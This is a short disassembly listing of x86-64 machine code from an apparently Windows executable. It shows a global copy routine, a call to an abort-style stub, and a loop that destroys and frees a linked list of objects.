   14000a2b1:	66 0f 6f 05 37 48 00 	movdqa 0x4837(%rip),%xmm0        # 0x14000eaf0
   14000a2b8:	00 
   14000a2b9:	f3 0f 7f 05 1f 58 01 	movdqu %xmm0,0x1581f(%rip)        # 0x14001fae0
   14000a2c0:	00 
   14000a2c1:	c6 05 08 58 01 00 00 	movb   $0x0,0x15808(%rip)        # 0x14001fad0
   14000a2c8:	48 83 c4 38          	add    $0x38,%rsp
   14000a2cc:	c3                   	ret
   14000a2cd:	45 33 c9             	xor    %r9d,%r9d
   14000a2d0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000a2d7:	00 00 
   14000a2d9:	45 33 c0             	xor    %r8d,%r8d
   14000a2dc:	33 d2                	xor    %edx,%edx
   14000a2de:	33 c9                	xor    %ecx,%ecx
   14000a2e0:	ff 15 6a 10 00 00    	call   *0x106a(%rip)        # 0x14000b350
   14000a2e6:	cc                   	int3
   14000a2e7:	cc                   	int3
   14000a2e8:	40 53                	rex push %rbx
   14000a2ea:	48 83 ec 20          	sub    $0x20,%rsp
   14000a2ee:	eb 3d                	jmp    0x14000a32d
   14000a2f0:	48 8b 03             	mov    (%rbx),%rax
   14000a2f3:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000a2f7:	48 89 05 42 61 01 00 	mov    %rax,0x16142(%rip)        # 0x140020440
   14000a2fe:	48 8b 01             	mov    (%rcx),%rax
   14000a301:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000a305:	ff 15 05 11 00 00    	call   *0x1105(%rip)        # 0x14000b410
   14000a30b:	48 8b c8             	mov    %rax,%rcx
   14000a30e:	48 85 c0             	test   %rax,%rax
   14000a311:	74 11                	je     0x14000a324
   14000a313:	48 8b 10             	mov    (%rax),%rdx
   14000a316:	48 8b 02             	mov    (%rdx),%rax
   14000a319:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a31e:	ff 15 ec 10 00 00    	call   *0x10ec(%rip)        # 0x14000b410
   14000a324:	48 8b cb             	mov    %rbx,%rcx
   14000a327:	ff 15 83 0f 00 00    	call   *0xf83(%rip)        # 0x14000b2b0
   14000a32d:	48 8b 1d 0c 61 01 00 	mov    0x1610c(%rip),%rbx        # 0x140020440
   14000a334:	48 85 db             	test   %rbx,%rbx
   14000a337:	75 b7                	jne    0x14000a2f0
   14000a339:	48 83 c4 20          	add    $0x20,%rsp
   14000a33d:	5b                   	pop    %rbx
   14000a33e:	c3                   	ret
